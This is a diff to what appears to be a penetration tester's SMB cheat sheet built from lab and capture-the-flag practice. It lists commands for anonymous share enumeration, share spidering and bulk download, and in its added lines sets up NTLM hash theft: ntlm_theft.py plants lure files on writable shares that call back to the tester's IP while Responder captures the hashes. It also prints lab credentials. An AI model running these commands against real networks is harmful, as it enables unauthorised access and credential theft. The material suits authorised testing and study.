@@ -21,6 +21,14 @@ smbclient -U '%' -N \\\\$ip\\share -m SMB3
 smbclient -L \\$ip -U "" -N -p 12445
 smbclient '//$ip/Sarge' -p 12445
 proxychains -q smbclient //172.16.173.21/monitoring -U "relia.com\andrea"
+smbclient.py -k @braavos.essos.local # -no-pass
+smbclient —kerberos //$dc/share
+
+
+cd /opt/ntlm_theft # If writable shares
+python ntlm_theft.py -g all -s $myip -f site
+sudo responder -I tun0 -d -w
+for file in $(ls .); do smbclient -U $user%$pass //$ip/Shared -c "put $file"; done
 
 smbclient.py $dom
 smbclient -W WORKGROUP -U % -t 5 -L //$dom -g
@@ -32,7 +40,7 @@ smbclient.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@$ip
 nxc smb $ip -u 'a' -p '' --shares # Guest logon
 nxc smb $ip  -u 'user' -p 'pass' -M spider_plus
 nxc SMB $ip -u USER -p PASSWORD --spider C\$ --pattern txt
-nxc smb $ip -u "V.Ventz" -p "HotelCalifornia194\!" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=1000000000
+nxc smb $ip -u $user -p $pass -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=1000000000
 
 rpcclient -N -U "" \\$ip
 rpcclient -U “” $ip ///when asked enter empty password
@@ -49,6 +57,8 @@ smbmap -H $ip
 smbmap -H $ip -u 'a' -p ''
 smbmap -H $ip -u '' -p '' -d $dom
 smbmap -H $ip -u '' -p '' -r 'IPC$'
+
+smbclient —kerberos //$dc/share
 ```
 
 #### Look up the SMB versions
